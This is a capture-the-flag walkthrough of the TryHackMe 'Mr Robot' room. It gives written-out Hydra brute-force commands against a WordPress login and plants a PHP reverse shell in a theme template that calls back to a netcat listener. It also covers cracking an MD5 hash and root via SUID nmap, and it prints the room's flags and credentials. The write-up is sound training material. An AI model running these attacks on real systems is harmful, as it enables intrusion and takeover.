# Room: Mr Robot

## General Info
- **Room link:** [Mr Robot](https://tryhackme.com/room/mrrobot)

## Description

Can you root this Mr. Robot styled machine? This is a virtual machine meant for beginners intermediate users. There are 3 hidden keys located on the machine, can you find them?

## Provided Files / Links
- [x] Target Machine IP (10.10.48.69) => created host robot.thm

## Enumeration / Recon
- Ports Enumeration

`nmap -sV robot.thm -O`

```
      Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-05-09 03:15 EDT
Nmap scan report for robot.thm (10.10.48.69)
Host is up (0.022s latency).
Not shown: 997 filtered tcp ports (no-response)
PORT    STATE  SERVICE  VERSION
22/tcp  closed ssh
80/tcp  open   http     Apache httpd
443/tcp open   ssl/http Apache httpd
Device type: general purpose|specialized|storage-misc|WAP|printer
Running (JUST GUESSING): Linux 3.X|4.X|5.X|2.6.X (89%), Crestron 2-Series (87%), HP embedded (87%), Asus embedded (86%)
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5.4 cpe:/o:crestron:2_series cpe:/h:hp:p2000_g3 cpe:/o:linux:linux_kernel:2.6.22 cpe:/h:asus:rt-n56u cpe:/o:linux:linux_kernel:3.4
Aggressive OS guesses: Linux 3.10 - 3.13 (89%), Linux 3.10 - 4.11 (88%), Linux 3.13 (88%), Linux 3.13 or 4.2 (88%), Linux 3.2 - 3.8 (88%), Linux 4.2 (88%), Linux 4.4 (88%), Linux 5.4 (88%), Linux 3.12 (87%), Linux 3.2 - 3.5 (87%)
No exact OS matches for host (test conditions non-ideal).

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 50.05 seconds

```

  - Notes:
    - Seems like SSH is closed
    - HTTP is open
    - Target machine OS seems to be Linux

- Website visit

A series of scenes from the TV show are displayed when you select commands from a terminal.
When selecting the commands, I get some prints in the console such as:

```
Array(5) [ {\u2026}, "Mr. Robot : Who Is Mr. Robot : prepare", "Video", "Mr. Robot : Who Is Mr. Robot", "Mr. Robot : Who Is Mr. Robot : prepare" ]
Array(5) [ {\u2026}, "Mr. Robot : Who Is Mr. Robot : Help", "Features", "Mr. Robot : Who Is Mr. Robot", "Mr. Robot : Who Is Mr. Robot : Help" ]
Array [ "ROUTE:", "fsociety" ]
Array(5) [ {\u2026}, "Mr. Robot : Who Is Mr. Robot : fsociety", "Video", "Mr. Robot : Who Is Mr. Robot", "Mr. Robot : Who Is Mr. Robot : fsociety" ]
Array [ "ROUTE:", "question" ]
Array(5) [ {\u2026}, "Mr. Robot : Who is Mr. Robot : FSociety Gallery : Photo 1", "Gallery", "Mr. Robot : Who Is Mr. Robot", "Mr. Robot : Who Is Mr. Robot : FSociety Gallery" ]
```

- Directories Enumeration

`gobuster dir -u http://10.10.48.69 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -o gobuster.txt`

 - /admin => redirect to /admin/index.html but something is broken here
 - /login => redirect to /wp-login.php (WordPress website)
 - /license => `what you do just pull code from Rapid9 or some s@#% since when did you become a script kitty?`
 - /readme => `I like where you head is at. However I'm not going to help you. `
 - /robots => (of course :-)) `fsocity.dic` and well `key-1-of-3.txt`

I downloaded the `fsocity.dic` dictionnary (pretty sure it will be usefull later).

With this finding, I immediately went to http://robot.thm/key-1-of-3.txt and found the 1st flag: **073403c8a58a1f80d943455fb30724b9**


## Exploitation / Analysis


### Wordpress Website

#### Credentials search


Before running any WP vulnerability scanner, I played around the login form. I first tried to find exploits with the reset password feature but I didn't find anything relevant. I then noticed the following error message when trying random username/password pairs in the login form: `ERROR: Invalid username.`

This is a bad authentification implementation and I'm going to try bruteforcing the credentials in 2-steps:
  
1st step: bruteforce the username ---- 2nd step: bruteforce the password with the correct username

In the previous /robots directory, I found a `fsocity.dic` dictionnary and I'll use it to find the username.

I had a quick look at the login POST request to find the correct username and password parameters.

**1st Step**:

Hydra command: `hydra -L fsocity.dic -p testpass 10.10.48.69 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:Invalid username"`

Result: `[80][http-post-form] host: 10.10.48.69   login: Elliot   password: testpass`

The username is **Elliot**.

**2nd Step**:

I will try to use the fsocity.dic first (858160 words) before using a bigger wordlist.

Hydra command: `hydra -l Elliot -P fsocity.dic 10.10.48.69 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:The password you entered for the username"`

The password is **ER28-0652**.

#### Website access

With the credentials, I was able to log in.
I then had a quick look at the plugins (11 plugins, a vulnerability assessment can be done later).
I went to the users section and found another user **krista Gordon** with the username **mich05654**.
In the user's page, the following text in the Biographical info: **another key?**.
I went on the website http://mrrobot.wikia.com/wiki/Krista_Gordon that was listed in the page to try my luck but didn't find any relevant information (I just found this sentence at the top of the page  **Communication is key,Elliot.**, but really didn't look into it too long).

There was not useful information in the other pages and I wanted to try to exploit the theme editor setting via RCE.
I used a php reverse shell from [pentestmonkey](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php) pasted it in the archives (archive.php) template page and changed the IP and port.

I then created a listener `nc -nlvp 33456` on my machine.
I accessed the reverse shell on http://10.10.48.69/wp-content/themes/twentyfifteen/archive.php and I was in the target machine.

### Target Machine Access


I stabilized the shell `python -c 'import pty; pty.spawn("/bin/bash")'`.
I am now a daemon user in the system.
I cannot get root access right away.
When looking into the home directory, I found a robot directory and was able to locate the second key and an encrypted password:
```
-r-------- 1 robot robot   33 Nov 13  2015 key-2-of-3.txt
-rw-r--r-- 1 robot robot   39 Nov 13  2015 password.raw-md5
```
I don't have the permission to read the key yet but i can read the hash.

Here comes John the Ripper to crack the md5 hash `john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt` and the result `abcdefghijklmnopqrstuvwxyz`.
I can now switch to the robot user (`su robot`) with the password and cat the 2nd key **822c73956184f694993bede3eb39f959**.

For privilege escalation, I downloaded `linpeas.sh` in the /tmp directory and executed the script.
I found this information that I can exploit: `-rwsr-xr-x 1 root root 493K Nov 13  2015 /usr/local/bin/nmap` (listed in the Files with interesting Permissions section).
In the https://gtfobins.github.io/gtfobins/nmap/ page, I found that nmap can be used to break out from restricted environments by spawning an interactive system shell on older versions (in this machine nmap version is 3.81).

I then used the following commands:
```
nmap --interactive
nmap> !sh
```
And I am now root.
I found the last flag in the root folder **04787ddef27c3dee1ee161b21670b4e4**.

## Final considerations

I actually didn't notice that the page /license that was found during directories enumeration was scrollable.
At the bottom of the page was the following string `ZWxsaW90OkVSMjgtMDY1Mgo=` that was giving me the correct username/password pair for the WordPress website authentification (**elliot:ER28-0652** when you decode it).
